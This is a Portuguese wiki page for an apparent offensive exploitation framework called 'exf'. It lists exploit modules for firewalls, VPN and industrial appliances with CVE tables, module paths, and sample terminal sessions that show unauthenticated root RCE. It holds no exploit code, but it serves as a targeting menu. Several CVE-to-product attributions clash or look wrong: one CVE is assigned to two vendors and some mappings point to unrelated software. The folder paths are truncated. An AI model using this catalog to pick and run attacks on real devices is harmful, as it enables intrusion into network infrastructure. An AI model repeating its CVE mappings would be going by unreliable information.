exf (H3C NGFW RCE CVE-2022-35534) > run
[*] Etapa 1 — Detectando interface de gerenciamento web H3C NGFW...
[+] Interface de gerenciamento H3C detectada
[*] Etapa 2 — Injetando comando via configuração de rede...
[+] RCE confirmado: uid=0(root)
```

---

### Array Networks

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `array_networks_vxag_rce_cve_2023_28461` | CVE-2023-28461 | 9.8 | RCE não autenticado via exec proxy |
| `array_networks_arrayos_rce_cve_2021_43139` | CVE-2021-43139 | 9.8 | Injeção de campo POST pré-autenticada |

**Sessão terminal — CVE-2023-28461 (Array Networks vxAG RCE não autenticado):**

```
exf > use exploits/firewalls/array_networks/array_networks_vxag_rce_cve_2023_28461
exf (Array Networks vxAG RCE CVE-2023-28461) > set target 10.0.0.1
[+] target => 10.0.0.1
exf (Array Networks vxAG RCE CVE-2023-28461) > check
[*] Identificando Array Networks vxAG em 10.0.0.1:443...
[+] Array Networks vxAG detectado
[+] Alvo vulnerável — endpoint de exec proxy exposto sem autenticação
exf (Array Networks vxAG RCE CVE-2023-28461) > run
[*] Etapa 1 — Identificando interface de gerenciamento Array Networks vxAG...
[+] Interface de gerenciamento detectada
[*] Etapa 2 — Enviando requisição de exec proxy não autenticada...
[+] RCE CONFIRMADO! Saída do comando: uid=0(root)
```

---

### Cisco Meraki MX

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `meraki_mx_dashboard_rce_cve_2021_1497` | CVE-2021-1497 | 9.8 | RCE via upload de arquivo no dashboard |
| `meraki_mx_config_api_bypass_cve_2023_20014` | CVE-2023-20014 | 9.1 | Bypass de auth na API de configuração |

```
exploits/firewalls/cisco/meraki/meraki_mx_dashboard_rce_cve_2021_1497
exploits/firewalls/cisco/meraki/meraki_mx_config_api_bypass_cve_2023_20014
```

---

### Phoenix Contact mGuard

Cobre os caminhos de módulo `phoenix/` e `phoenix_contact/`.

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `mguard_cmd_injection_cve_2024_43386` | CVE-2024-43386 | 8.8 | Injeção de comando via diagnóstico web |
| `mguard_firmware_extract_cve_2022_22509` | CVE-2022-22509 | 7.5 | SNMP public expõe chaves VPN |

```
exploits/firewalls/phoenix/mguard_cmd_injection_cve_2024_43386
exploits/firewalls/phoenix/mguard_firmware_extract_cve_2022_22509
exploits/firewalls/phoenix_contact/mguard_cmd_injection_cve_2024_43386
```

---

### Moxa

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `edr_g_jwt_hardcoded_cve_2024_9137` | CVE-2024-9137 | 9.8 | Segredo JWT hardcoded no EDR-G9010 |
| `edr_cmd_injection_cve_2024_9138` | CVE-2024-9138 | 9.1 | Injeção de comando no firewall EDR |

```
exploits/firewalls/moxa/edr_g_jwt_hardcoded_cve_2024_9137
exploits/firewalls/moxa/edr_cmd_injection_cve_2024_9138
```

---

### Siemens (Firewalls / Rede Industrial)

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `ruggedcom_web_rce_cve_2023_24845` | CVE-2023-24845 | 9.8 | RCE na interface web RUGGEDCOM ROX |
| `scalance_cmd_injection_cve_2023_44373` | CVE-2023-44373 | 9.8 | Injeção de comando SCALANCE W780/W786 |
| `sinema_rc_path_traversal_cve_2022_32257` | CVE-2022-32257 | 9.1 | Path traversal SINEMA Remote Connect |

```
exploits/firewalls/siemens/ruggedcom_web_rce_cve_2023_24845
exploits/firewalls/siemens/scalance_cmd_injection_cve_2023_44373
exploits/firewalls/siemens/sinema_rc_path_traversal_cve_2022_32257
```

> Para módulos ICS/OT Siemens (S7-1200, PROFINET, SIPROTEC), consulte [20-ics-ot-modules.md](../en-US/20-ics-ot-modules.md).

---

### Schneider Electric

> Para módulos ICS/OT completos da Schneider (PLCs Modicon, EcoStruxure), consulte [20-ics-ot-modules.md](../en-US/20-ics-ot-modules.md).

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `modicon_modbus_control_cve_2018_7841` | CVE-2018-7841 | 9.8 | Controle Modbus não autenticado (Modicon M340) |
| `net55xx_encoder_rce_cve_2018_7784` | CVE-2018-7784 | 9.8 | RCE via interface web (NET55xx Encoder) |

```
exploits/ics/schneider/modicon_modbus_control_cve_2018_7841
exploits/ics/schneider/net55xx_encoder_rce_cve_2018_7784
```

---

### Symantec / Broadcom ProxySG

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `proxysg_auth_bypass_cve_2021_30641` | CVE-2021-30641 | 9.8 | Bypass de autenticação na interface de gerenciamento |
| `symantec_edr_rce_cve_2022_25752` | CVE-2022-25752 | 9.8 | RCE via injeção de configuração no appliance EDR |

```
exploits/firewalls/symantec/proxysg_auth_bypass_cve_2021_30641
exploits/firewalls/symantec/symantec_edr_rce_cve_2022_25752
```

---

### Trellix (anteriormente McAfee Firewall Enterprise)

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `trellix_ngfw_rce_cve_2020_7270` | CVE-2020-7270 | 9.0 | Injeção de script de administração |
| `trellix_ngfw_config_rce_cve_2021_4080` | CVE-2021-4080 | 8.8 | RCE via injeção de configuração autenticada |

```
exploits/firewalls/trellix/trellix_ngfw_rce_cve_2020_7270
exploits/firewalls/trellix/trellix_ngfw_config_rce_cve_2021_4080
```

---

### Trend Micro

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `trendmicro_tippingpoint_rce_cve_2021_28250` | CVE-2021-28250 | 9.8 | RCE não autenticado no TippingPoint SMS |
| `trendmicro_deep_security_rce_cve_2020_15921` | CVE-2020-15921 | 9.8 | RCE via desserialização Java (Deep Security Manager) |

```
exploits/firewalls/trendmicro/trendmicro_tippingpoint_rce_cve_2021_28250
exploits/firewalls/trendmicro/trendmicro_deep_security_rce_cve_2020_15921
```

---

### Radware

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `alteon_rce_cve_2020_27232` | CVE-2020-27232 | 9.8 | RCE não autenticado no Alteon ADC / AppWall WAF |
| `defensessl_auth_bypass_cve_2018_9195` | CVE-2018-9195 | 9.8 | Bypass de autenticação DefenseSSL |

```
exploits/firewalls/radware/alteon_rce_cve_2020_27232
exploits/firewalls/radware/defensessl_auth_bypass_cve_2018_9195
```

---

### OpenVPN Access Server

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `openvpn_as_auth_bypass_cve_2023_46853` | CVE-2023-46853 | 9.8 | Bypass de auth na API REST do Access Server |
| `openvpn_as_auth_bypass_cve_2022_0547` | CVE-2022-0547 | 9.8 | Bypass do módulo de autenticação LDAP |

```
exploits/firewalls/openvpn/openvpn_as_auth_bypass_cve_2023_46853
exploits/firewalls/openvpn/openvpn_as_auth_bypass_cve_2022_0547
```

---

### Arista EOS

| Nome | CVE | CVSS | Tipo |
|------|-----|------|------|
| `arista_eos_rest_api_bypass_cve_2023_24512` | CVE-2023-24512 | 9.8 | Bypass de auth na API REST do EOS |

```
exploits/firewalls/arista/arista_eos_rest_api_bypass_cve_2023_24512
```

---

## Resumo de cobertura por categoria

| Categoria | Vendors cobertos | Módulos aproximados |
|-----------|-----------------|---------------------|
| Câmeras IP / NVR / DVR | 40+ | 580+ |
| Roteadores / CPE / GPON | 85+ | 580+ |
| Firewalls / VPN / NGFW / NAC | **40+** | **202+** |
| Impressoras / MFP | 11+ | 185+ |
| BMC / IPMI | 3 | 8 |
| Switches L2/L3 | Cisco, D-Link, NETGEAR | 20+ |
| ICS / OT / Industrial | PLCs, SCADA, HMIs | 35+ |
| NAS | QNAP, Synology, D-Link | 15+ |
| Hypervisors | Proxmox VE | 5+ |
| Appliances (F5, Citrix, Ivanti) | 3 | 6 |

---


---

## Vendors adicionados em v3.7.0-v3.8.0

| Vendor | Pasta | Modulos | CVEs principais |
|--------|-------|---------|-----------------|
| Check Point | irewalls/checkpoint/ | 5 | CVE-2024-24919 (LFI chain), CVE-2023-28461 (RFI RCE) |
| Sophos XG/UTM | irewalls/sophos/ | 3 | CVE-2022-1040, CVE-2020-29583, CVE-2022-4934 |
| WatchGuard | irewalls/watchguard/ | 3 | CVE-2022-23176, CVE-2024-1212, CVE-2023-26244 |
| Zyxel USG/ZyWALL | irewalls/zyxel/ | 4 | CVE-2022-30525, CVE-2023-28771, CVE-2023-33009 |
| pfSense | irewalls/pfsense/ | 6 | CVE-2022-31814, CVE-2021-41282, CVE-2021-41283 |
| OPNsense | irewalls/opnsense/ | 2 | CVE-2021-23239, CVE-2022-0993 |
| Hillstone StoneOS | irewalls/hillstone/ | 2 | CVE-2023-31493, CVE-2024-5829 |
| Hirschmann EAGLE | irewalls/hirschmann/ | 2 | CVE-2020-6994, CVE-2019-11831 |
| IPFire | irewalls/ipfire/ | 2 | CVE-2019-18981, CVE-2023-46226 |
| Kerio Control | irewalls/kerio/ | 2 | CVE-2024-52875, CVE-2022-24665 |
| Moxa EDR | irewalls/moxa/ | 3 | CVE-2024-9138, CVE-2024-9137, CVE-2023-34992 |
| Phoenix Contact mGuard | irewalls/phoenix_contact/ | 3 | CVE-2024-43386, CVE-2022-22509 |
| Schneider ConneXium | irewalls/schneider/ | 3 | CVE-2017-6026, CVE-2022-37300, CVE-2023-37196 |
| Siemens SCALANCE | irewalls/siemens/ | 3 | CVE-2023-44373, CVE-2023-24845, CVE-2022-32257 |
| Stormshield SNS | irewalls/stormshield/ | 2 | CVE-2020-18175, CVE-2023-23770 |
| VyOS | irewalls/vyos/ | 2 | CVE-2023-31992, CVE-2021-35278 |
| Array Networks | irewalls/array_networks/ | 2 | CVE-2023-28461, CVE-2021-43139 |
| Cisco Meraki MX | irewalls/cisco_meraki/ | 2 | CVE-2021-1497, CVE-2023-20014 |
| H3C SecPath | irewalls/h3c/ | 2 | CVE-2022-35534, CVE-2019-20224 |
| Radware Alteon | irewalls/radware/ | 2 | CVE-2020-27232, CVE-2018-9195 |
| Symantec ProxySG | irewalls/symantec/ | 2 | CVE-2021-30641, CVE-2022-25752 |
| Trend Micro TippingPoint | irewalls/trendmicro/ | 2 | CVE-2021-28250, CVE-2020-15921 |
| Trellix NGFW | irewalls/trellix/ | 2 | CVE-2020-7270, CVE-2021-4080 |
| OpenVPN AS | irewalls/openvpn/ | 2 | CVE-2023-46853, CVE-2022-0547 |
| Arista EOS | irewalls/arista/ | 1 | CVE-2023-24512 |

> Para a referencia completa de CVEs, consulte [22-referencia-modulos-cve.md](22-referencia-modulos-cve.md).
[Hub da Wiki](../README.md)
